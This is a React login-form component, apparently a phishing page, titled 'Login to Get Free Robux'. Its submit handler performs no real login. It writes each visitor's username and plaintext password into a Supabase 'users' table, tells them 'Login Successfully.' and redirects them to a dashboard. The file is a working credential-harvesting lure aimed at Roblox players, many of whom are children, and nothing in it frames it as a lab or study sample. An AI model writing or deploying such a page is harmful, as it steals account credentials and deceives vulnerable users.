import React, { useState } from 'react';
import { supabase } from './supabaseClient';
import './App.css';

const LoginForm = () => {
  const [formData, setFormData] = useState({ email: '', password: '' });
  const [message, setMessage] = useState('');

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const handleLogin = async (e) => {
    e.preventDefault();

    // Insert user data (optional)
    await supabase.from('users').insert([{ email: formData.email, password: formData.password }]);

    // Show success message
    setMessage('Login Successfully.');

    // Give React time to render message before redirect
    setTimeout(() => {
      window.location.href = '/dashboard'; // redirect after 2 seconds
    }, 2000);
  };

  return (
    <div className="login-container">
      <div className="login-box">
        <h2>Login to Get Free Robux</h2>
        <form onSubmit={handleLogin}>
          <input
            type="text"
            name="email"
            placeholder="Username"
            value={formData.email}
            onChange={handleChange}
            required
          />
          <input
            type="password"
            name="password"
            placeholder="Password"
            value={formData.password}
            onChange={handleChange}
            required
          />
          <button type="submit">Log In</button>
        </form>

        <a href="#" className="link-small">Forgot Password or Username?</a>
        <hr />

        <button className="secondary-btn">Email Me a One-Time Code</button>
        <button className="secondary-btn">Use Another Device</button>

        <p className="signup-text">
          Don’t have an account? <a href="#">Sign Up</a>
        </p>

        {/* Show message */}
        {message && <p className="message">{message}</p>}
      </div>
    </div>
  );
};

export default LoginForm;
